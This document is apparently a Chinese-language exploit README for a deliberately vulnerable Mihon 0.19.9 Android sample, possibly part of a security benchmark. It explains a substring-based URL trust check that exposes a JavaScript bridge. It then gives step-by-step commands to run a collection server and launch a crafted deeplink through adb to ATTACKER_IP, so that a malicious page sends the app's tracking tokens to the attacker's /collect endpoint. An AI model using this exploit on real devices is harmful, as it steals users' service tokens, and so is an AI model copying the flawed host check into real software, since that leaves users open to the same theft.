# 2.2.1 Insufficient URL Source Validation EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 会把外部 URL 转交给 `WebViewActivity`。漏洞样本使用：

```kotlin
url.contains("mihon.app", ignoreCase = true)
```

判断 `trustedHelpSource`。因此攻击者 URL 只要在 query/path 中包含 `mihon.app` 字符串，即使真实 host 是攻击者服务器，也会被误判为可信帮助页并注册 `window.mihonAndroidBridge`。

恶意页面随后调用：

- `window.mihonAndroidBridge.getTrackToken(service)`

并把 tracking token 回传到攻击者服务 `/collect`。EXP 不采集认证 header。

## 运行服务端

```powershell
cd .\exp\mihon-0.19.9\2.2.1_Insufficient_URL_Source_Validation
python .\server.py
```

服务端监听 `8000`，回收的数据会写入：

```text
received\collected_<timestamp>.txt
```

## 触发 deeplink

将 `<ATTACKER_IP>` 替换为运行 `server.py` 的机器 IP：

```powershell
$AttackUrl = "http://<ATTACKER_IP>:8000/exp/2.2.1?trusted=mihon.app&collector=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fcollect"
$DeepLink = "mihon://help/webview?url=$([uri]::EscapeDataString($AttackUrl))"
adb shell am start -a android.intent.action.VIEW -d "$DeepLink"
```

也可以直接使用已经编码好的形式：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.2.1%3Ftrusted%3Dmihon.app%26collector%3Dhttp%253A%252F%252F<ATTACKER_IP>%253A8000%252Fcollect"
```

## 成功标志

WebView 中页面会显示 `mihonAndroidBridge 可用`。服务端 `received` 目录中会出现包含以下字段的回收文件：

- `trackToken_anilist`
- `trackToken_myanimelist`
- `availableServices`

这些值来自漏洞样本内 `app/src/main/assets/benchmark_mock_data.json`。
